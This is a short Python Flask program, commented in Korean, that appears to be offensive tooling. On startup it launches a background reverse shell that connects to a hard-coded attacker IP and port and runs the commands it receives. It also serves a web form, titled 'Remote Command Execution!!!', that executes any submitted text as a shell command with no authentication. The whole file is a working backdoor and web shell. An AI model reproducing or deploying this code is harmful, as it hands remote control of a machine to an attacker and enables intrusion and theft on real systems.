from flask import Flask, request, render_template_string
import subprocess
import socket
import threading

app = Flask(__name__)

# Reverse Shell 설정
ATTACKER_IP = "192.168.1.200"  # 공격자의 IP 입력
ATTACKER_PORT = 4444  # 공격자의 리버스 쉘 리스닝 포트

def reverse_shell():
    """공격자의 서버로 Reverse Shell 연결"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            s.send(output.encode("utf-8"))
    except Exception as e:
        pass
    finally:
        s.close()

# Reverse Shell 실행 (백그라운드 스레드에서 실행)
threading.Thread(target=reverse_shell, daemon=True).start()

# 웹에서 사용자 입력 실행
@app.route("/", methods=["GET", "POST"])
def index():
    output = ""
    if request.method == "POST":
        command = request.form.get("command")
        if command:
            output = subprocess.getoutput(command)  # 사용자 입력을 쉘에서 실행
    return render_template_string('''
        <h2>Remote Command Execution!!!</h2>
        <form method="post">
            <input type="text" name="command" placeholder="Enter command">
            <input type="submit" value="Execute">
        </form>
        <pre>{{ output }}</pre>
    ''', output=output)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)